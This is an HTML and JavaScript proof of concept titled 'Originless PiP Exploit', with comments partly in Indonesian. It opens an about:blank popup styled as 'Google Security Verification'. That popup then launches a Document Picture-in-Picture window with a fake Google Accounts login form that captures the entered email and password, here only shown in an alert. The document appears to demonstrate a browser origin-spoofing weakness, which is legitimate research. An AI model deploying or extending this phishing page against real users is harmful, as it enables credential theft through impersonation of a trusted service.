<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Originless PiP Exploit</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #f4f4f4; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
  .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; }
  h2 { color: #4285f4; margin-bottom: 10px; }
  p { color: #666; font-size: 14px; margin-bottom: 20px; }
  button { padding: 15px 30px; background: #1a73e8; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; }
  button:hover { background: #1557b0; }
  #status { margin-top: 20px; font-family: monospace; font-size: 12px; color: #666; }
</style>
</head>
<body>

<div class="panel" id="main-card">
  <h2>🔒 Originless PiP Exploit</h2>
  <p>Klik tombol di bawah untuk membuka PiP dari pop-up about:blank (originless).</p>
  <button id="startBtn">Open Originless PiP</button>
  <div id="status">[*] Ready...</div>
</div>

<script>
(function () {
  'use strict';

  var btn = document.getElementById('startBtn');
  var statusEl = document.getElementById('status');

  function log(msg) {
    statusEl.textContent = msg;
    console.log("[Originless PiP] " + msg);
  }

  // ============================================
  // 1. TRIGGER (KLIK)
  // ============================================
  btn.addEventListener('click', async function() {
    log("[*] Membuka pop-up about:blank...");

    try {
      // ============================================
      // A. BUKA POP-UP ABOUT:BLANK
      // ============================================
      var popup = window.open('about:blank', '_blank', 'width=800,height=600');
      if (!popup) {
        log("[-] Popup diblokir.");
        return;
      }

      // ============================================
      // B. SUNTIKKAN KONTEN KE POP-UP (document.write)
      // ============================================
      popup.document.open();
      popup.document.write(`
        <!DOCTYPE html>
        <html>
        <head>
          <meta charset="UTF-8">
          <title>Google Security Verification</title>
          <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
              font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
              background: #fff;
              display: flex;
              flex-direction: column;
              justify-content: center;
              align-items: center;
              min-height: 100vh;
              padding: 20px;
              text-align: center;
            }
            .g-logo {
              font-size: 48px;
              font-weight: bold;
              color: #4285f4;
              margin-bottom: 20px;
            }
            h3 { font-size: 24px; color: #333; margin-bottom: 10px; }
            p { font-size: 14px; color: #666; margin-bottom: 30px; }
            button {
              padding: 15px 30px;
              background: #1a73e8;
              color: #fff;
              border: none;
              border-radius: 8px;
              font-size: 16px;
              font-weight: bold;
              cursor: pointer;
            }
            button:hover { background: #1557b0; }
          </style>
        </head>
        <body>
          <div class="g-logo">G</div>
          <h3>Google Security Verification</h3>
          <p>Click the button below to open Picture-in-Picture.</p>
          <button id="openPipBtn">Open PiP</button>

          <script>
            (function() {
              document.getElementById('openPipBtn').addEventListener('click', async function() {
                try {
                  if (!window.documentPictureInPicture) {
                    alert("Document Picture-in-Picture tidak didukung.");
                    return;
                  }
                  var pipWindow = await documentPictureInPicture.requestWindow({
                    width: 400,
                    height: 300
                  });
                  
                  // Tulis konten ke PiP (tanpa origin)
                  pipWindow.document.body.innerHTML = \`
                    <div style="font-family:sans-serif;text-align:center;padding:20px;">
                      <h3>Google Accounts</h3>
                      <p>This PiP window may have no origin attribution.</p>
                      <input type="email" id="pipEmail" placeholder="Email or phone" style="width:100%;padding:10px;margin-bottom:10px;border:1px solid #ddd;border-radius:4px;" />
                      <input type="password" id="pipPassword" placeholder="Password" style="width:100%;padding:10px;margin-bottom:10px;border:1px solid #ddd;border-radius:4px;" />
                      <button id="pipLogin" style="width:100%;padding:10px;background:#1a73e8;color:#fff;border:none;border-radius:4px;cursor:pointer;">Next</button>
                    </div>
                  \`;
                  
                  pipWindow.document.getElementById('pipLogin').addEventListener('click', function() {
                    var email = pipWindow.document.getElementById('pipEmail').value;
                    var password = pipWindow.document.getElementById('pipPassword').value;
                    alert('Captured: ' + email + ' / ' + password);
                  });
                  
                } catch (e) {
                  alert('PiP Error: ' + e.message);
                }
              });
            })();
          <\/script>
        </body>
        </html>
      `);
      popup.document.close();

      log("[+] Pop-up about:blank created with PiP trigger.");

    } catch (e) {
      log("[-] Error: " + e.message);
    }
  }, { once: true });

})();
</script>

</body>
</html>
